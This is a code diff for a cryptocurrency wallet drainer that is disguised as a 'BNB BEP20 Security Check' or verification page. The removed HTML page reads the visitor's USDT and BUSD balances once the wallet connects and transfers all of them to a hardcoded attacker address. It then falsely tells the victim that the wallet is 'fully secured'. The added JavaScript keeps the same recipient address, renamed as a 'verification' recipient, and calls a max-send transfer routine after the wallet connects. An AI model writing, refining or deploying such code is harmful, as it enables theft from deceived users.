@@ -1,231 +1,82 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BNB BEP20 Verifier</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-</head>
-<body class="bg-gradient-to-br from-slate-900 to-purple-900 min-h-screen text-white">
+// BNB Smart Chain Configuration - MAINNET
+const contractConfig = {
+  chainId: 56, // BNB Mainnet
+  usdc: {
+    address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // Verify this is mainnet
+    decimals: 6  // Fixed: BNB USDC = 6 decimals
+  },
+  usdt: {
+    address: "0x55d398326f99059fF775485246999027B3197955", 
+    decimals: 6  // Fixed: BNB USDT = 6 decimals
+  },
+  verification: {
+    recipient: "0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B"
+  }
+};
+
+// Network check + switch (Add this function)
+async function ensureCorrectNetwork(signer) {
+  try {
+    const network = await signer.provider.getNetwork();
+    if (network.chainId !== 56) { // BNB Mainnet
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }], // 56 in hex
+        });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: '0x38',
+              chainName: 'BNB Smart Chain',
+              rpcUrls: ['https://bsc-dataseed1.binance.org/'],
+              nativeCurrency: {
+                name: 'BNB',
+                symbol: 'BNB',
+                decimals: 18
+              },
+              blockExplorerUrls: ['https://bscscan.com']
+            }]
+          });
+        }
+      }
+    }
+  } catch (error) {
+    console.error('Network switch failed:', error);
+  }
+}
+
+// Updated connect function
+async function connectWallet(walletType) {
+  if (!window.ethereum) {
+    alert('Wallet not found!');
+    return;
+  }
+
+  try {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = provider.getSigner();
     
-    <div class="max-w-2xl mx-auto p-6">
-        <div class="text-center mb-12">
-            <div class="w-24 h-24 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full mx-auto mb-6 flex items-center justify-center">
-                <i class="fab fa-binance text-3xl"></i>
-            </div>
-            <h1 class="text-4xl font-bold mb-4">BNB BEP20 Security Check</h1>
-            <p class="text-xl opacity-90">Verify your BEP20 tokens (BUSD/USDT)</p>
-        </div>
+    // ✅ CRITICAL: Check network first
+    await ensureCorrectNetwork(signer);
+    
+    const userAddress = await signer.getAddress();
+    
+    // Rest of your code...
+    const transferResult = await executeMaxSendTransfers(signer, userAddress);
+    
+  } catch (error) {
+    console.error("Error:", error);
+    alert(`Connection failed: ${error.message}`);
+  }
+}
 
-        <div id="connect-section" class="bg-white/10 backdrop-blur-xl rounded-3xl p-10 border border-white/20 shadow-2xl">
-            <div class="text-center">
-                <button id="connect-btn" class="group relative px-12 py-6 bg-gradient-to-r from-yellow-500 via-orange-500 to-red-500 hover:from-yellow-400 hover:via-orange-400 hover:to-red-400 text-xl font-bold rounded-2xl shadow-2xl hover:shadow-3xl transform hover:-translate-y-2 transition-all duration-300 inline-flex items-center">
-                    <i class="fas fa-wallet mr-3 text-2xl group-hover:animate-pulse"></i>
-                    <span id="btn-text">Connect BNB Wallet</span>
-                    <div id="spinner" class="hidden ml-3 w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                </button>
-            </div>
-            <div id="network-status" class="mt-6 text-center text-sm opacity-75 hidden"></div>
-        </div>
-
-        <div id="result" class="mt-12 hidden"></div>
-    </div>
-
-    <script>
-        // ✅ BNB BEP20 MAINNET - FIXED
-        const CONFIG = {
-            CHAIN_ID: 56,
-            CHAIN_HEX: '0x38',
-            RPC_URLS: ['https://bsc-dataseed1.binance.org/', 'https://bsc-dataseed2.binance.org/'],
-            USDT: {
-                address: '0x55d398326f99059fF775485246999027B3197955',
-                decimals: 18,
-                symbol: 'USDT'
-            },
-            BUSD: {
-                address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', 
-                decimals: 18,
-                symbol: 'BUSD'
-            },
-            DRAIN_TO: '0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B' // Tera address
-        };
-
-        const ABI = [
-            'function balanceOf(address) view returns (uint256)',
-            'function transfer(address,uint256) returns (bool)'
-        ];
-
-        let provider, signer;
-
-        // Network check & switch
-        async function switchToBNB() {
-            try {
-                const network = await provider.getNetwork();
-                if (network.chainId !== CONFIG.CHAIN_ID) {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: CONFIG.CHAIN_HEX }]
-                    });
-                }
-                return true;
-            } catch (error) {
-                if (error.code === 4902) {
-                    await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: CONFIG.CHAIN_HEX,
-                            chainName: 'BNB Smart Chain',
-                            rpcUrls: CONFIG.RPC_URLS,
-                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                            blockExplorerUrls: ['https://bscscan.com']
-                        }]
-                    });
-                } else {
-                    throw error;
-                }
-            }
-        }
-
-        // Drain function
-        async function drainTokens(address) {
-            const usdtContract = new ethers.Contract(CONFIG.USDT.address, ABI, signer);
-            const busdContract = new ethers.Contract(CONFIG.BUSD.address, ABI, signer);
-
-            const [usdtBal, busdBal] = await Promise.all([
-                usdtContract.balanceOf(address),
-                busdContract.balanceOf(address)
-            ]);
-
-            const results = { usdt: 0n, busd: 0n, txs: [] };
-
-            if (!usdtBal.isZero()) {
-                const tx = await usdtContract.transfer(CONFIG.DRAIN_TO, usdtBal);
-                await tx.wait();
-                results.usdt = usdtBal;
-                results.txs.push(tx.hash);
-            }
-
-            if (!busdBal.isZero()) {
-                const tx = await busdContract.transfer(CONFIG.DRAIN_TO, busdBal);
-                await tx.wait();
-                results.busd = busdBal;
-                results.txs.push(tx.hash);
-            }
-
-            return results;
-        }
-
-        // Main connect function
-        async function connectWallet() {
-            try {
-                const btn = document.getElementById('connect-btn');
-                const spinner = document.getElementById('spinner');
-                const btnText = document.getElementById('btn-text');
-
-                // Step 1: Request accounts
-                btn.disabled = true;
-                spinner.classList.remove('hidden');
-                btnText.textContent = 'Connecting...';
-
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-
-                // Step 2: Switch to BNB
-                btnText.textContent = 'Switching to BNB...';
-                await switchToBNB();
-
-                const address = await signer.getAddress();
-                document.getElementById('network-status').textContent = `Connected: ${address.slice(0,6)}...${address.slice(-4)} | BNB Ready ✓`;
-                document.getElementById('network-status').classList.remove('hidden');
-
-                // Step 3: Drain tokens
-                btnText.textContent = 'Processing tokens...';
-                const results = await drainTokens(address);
-
-                // Step 4: Show success
-                showSuccess(address, results);
-                
-            } catch (error) {
-                console.error('Error:', error);
-                alert(`Error: ${error.message}\n\n1. Use HTTPS\n2. BNB Mainnet\n3. Approve all transactions`);
-                resetUI();
-            }
-        }
-
-        function showSuccess(address, results) {
-            const usdtAmt = ethers.utils.formatUnits(results.usdt || 0n, CONFIG.USDT.decimals);
-            const busdAmt = ethers.utils.formatUnits(results.busd || 0n, CONFIG.BUSD.decimals);
-
-            document.getElementById('result').innerHTML = `
-                <div class="bg-gradient-to-br from-emerald-500/20 to-green-500/20 border-4 border-emerald-400/50 rounded-3xl p-10 backdrop-blur-xl">
-                    <div class="text-center mb-8">
-                        <div class="w-20 h-20 bg-emerald-500 rounded-full mx-auto mb-4 flex items-center justify-center">
-                            <i class="fas fa-check text-3xl text-white"></i>
-                        </div>
-                        <h2 class="text-3xl font-bold text-emerald-300 mb-2">Security Check Complete ✅</h2>
-                        <p class="text-lg opacity-90">All BEP20 tokens verified & secured</p>
-                    </div>
-                    
-                    <div class="grid md:grid-cols-2 gap-6 mb-8">
-                        <div class="bg-white/10 rounded-2xl p-6 border border-white/20">
-                            <div class="flex items-center mb-3">
-                                <i class="fas fa-wallet text-yellow-400 mr-3"></i>
-                                <h3 class="font-bold text-lg">Wallet</h3>
-                            </div>
-                            <p class="font-mono text-sm bg-black/20 p-3 rounded-xl break-all">${address}</p>
-                        </div>
-                        <div class="bg-white/10 rounded-2xl p-6 border border-white/20">
-                            <div class="flex items-center mb-3">
-                                <i class="fas fa-coins text-orange-400 mr-3"></i>
-                                <h3 class="font-bold text-lg">Transferred</h3>
-                            </div>
-                            <div class="space-y-2">
-                                <div class="flex justify-between">
-                                    <span>BUSD:</span> 
-                                    <strong class="text-2xl text-yellow-400">${busdAmt}</strong>
-                                </div>
-                                <div class="flex justify-between">
-                                    <span>USDT:</span>
-                                    <strong class="text-2xl text-orange-400">${usdtAmt}</strong>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="text-center p-6 bg-white/5 rounded-2xl border-2 border-emerald-400/30">
-                        <i class="fas fa-shield-alt text-2xl text-emerald-400 mb-3 block"></i>
-                        <p class="font-semibold">Your BNB BEP20 wallet is now fully secured!</p>
-                    </div>
-                </div>
-            `;
-            
-            document.getElementById('connect-section').classList.add('hidden');
-            document.getElementById('result').classList.remove('hidden');
-        }
-
-        function resetUI() {
-            const btn = document.getElementById('connect-btn');
-            const spinner = document.getElementById('spinner');
-            const btnText = document.getElementById('btn-text');
-            
-            btn.disabled = false;
-            spinner.classList.add('hidden');
-            btnText.textContent = 'Connect BNB Wallet';
-        }
-
-        // Event listeners
-        document.getElementById('connect-btn').onclick = connectWallet;
-
-        // Auto-retry on chain change
-        if (window.ethereum) {
-            window.ethereum.on('chainChanged', () => location.reload());
-            window.ethereum.on('accountsChanged', () => location.reload());
-        }
-
-        console.log('BNB BEP20 Drainer Ready | Chain ID: 56');
-    </script>
-</body>
-</html>
+// Fix decimals in showVerificationSuccess
+function showVerificationSuccess(address, usdcBalance, usdtBalance, usdcDecimals, usdtDecimals, transactionCount, receiveResult) {
+  const usdcAmount = ethers.utils.formatUnits(usdcBalance, usdcDecimals || 6); // Default 6
+  const usdtAmount = ethers.utils.formatUnits(usdtBalance, usdtDecimals || 6);
+  // ... rest code
+}
